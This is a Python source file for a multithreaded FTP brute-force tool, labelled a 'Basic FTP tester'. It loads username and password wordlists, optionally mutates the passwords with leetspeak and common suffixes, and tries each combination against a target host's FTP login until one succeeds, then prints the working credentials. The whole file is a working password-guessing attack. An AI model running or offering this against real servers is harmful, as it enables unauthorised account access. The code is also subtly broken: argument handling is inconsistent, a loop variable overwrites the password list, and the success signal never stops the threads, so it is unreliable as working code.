import ftplib
import argparse
import threading
from  queue import Queue


combo_queue = Queue()
result_lock = threading.Lock()
stop_event = threading.Event()


parser = argparse.ArgumentParser(description="Basic FTP tester")


parser.add_argument("-ho","--host",required=True, type=str, help="Enter the target to test ftp")
parser.add_argument("-p","--passfile",required=True,type=str,help="Enter the path of file containing password list")
parser.add_argument("-t","--threads",type=int,help="enter the number of threads. Default : 20")
parser.add_argument("-u","--user",default=20,required=True,type=str,help="enter the Username to connect to provided host")
parser.add_argument("-m","--mutate",action="store_true",help="Enable this Flag if you want to mutate the wordlists")
args = parser.parse_args()



host = args.host
user = args.user
passfile = args.passfile
threads = args.threads if args.threads else 20
mutant = args.mutate


def smart_mutate(base_word):
    leet_map = {'a': '@', 'i': '1', 'e': '3', 'o': '0', 's': '$'}

    mutations = set()

    # Basic variations
    mutations.add(base_word)
    mutations.add(base_word.capitalize())
    mutations.add(base_word.upper())

    # Common suffixes
    suffixes = ["123", "!", "2024", "@"]
    for word in list(mutations):
        for suffix in suffixes:
            mutations.add(word + suffix)

    # Leetspeak (simple version)
    for word in list(mutations):
        for orig, repl in leet_map.items():
            if orig in word:
                mutations.add(word.replace(orig, repl))

    return mutations





def passwd(passfile):
    with open(passfile , 'r', encoding='utf-8') as f:
        return[line.strip('\n') for line in f]
    
passwords = passwd(passfile)


def userb(user):
    with open(user , 'r' , encoding='utf-8') as f:
        return[line.strip('\n') for line in f]
    
users = userb(user)


#passwords_iter = iter(passwords)
event_done = threading.Event()

trueuser = None
truepasswd = None



        

if mutant:
    for userc in users:
        for base in passwords:
            for passwords in smart_mutate(base):
                combo_queue.put((userc, passwords))
else:
    for userc in users:
        for password in passwords:
            combo_queue.put((userc,password))





def workers():
    global trueuser, truepasswd
    while not combo_queue.empty():
        if stop_event.is_set():
            break
        
        userc, password = combo_queue.get()
        
        try:
            if stop_event.is_set():
                combo_queue.task_done()
                return
            with ftplib.FTP() as serve:
                serve.connect(host, 21, timeout=5)
                serve.login(userc, password)
                print("||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||")
                print("===========================================================================\n")
                print(" The Password was Found and Connection was Success\n")
                print(f"Connect with {host} as {userc}  :   {password}\n")
                trueuser = userc
                truepasswd = password
                event_done.set()
                break
        except Exception as e:
            print(f"Connection failed with {userc}  :   {password}")






'''for password in passwords:
    try:
        with ftplib.FTP() as serve:
            serve.connect(host,21,timeout=5)
            serve.login(user,password)
            print("||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||")
            print("===========================================================================\n")
            print(" The Password was Found and Connection was Success\n")
            print(f"Connect with {host} as {user}  :   {password}\n")
            break


    except Exception as e:
        print(f"Connection failed with {user}  :   {password}")'''



thread_list = []
for _ in range(threads):
    t= threading.Thread(target=workers)
    t.start()
    thread_list.append(t)



for t in thread_list:
    t.join()



print("||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||")
print("===========================================================================\n")
if trueuser and truepasswd:
    print(f"\n[+] Found credentials: {trueuser}   :   {truepasswd}\n")
else:
    print("\n[-] No valid credentials found.")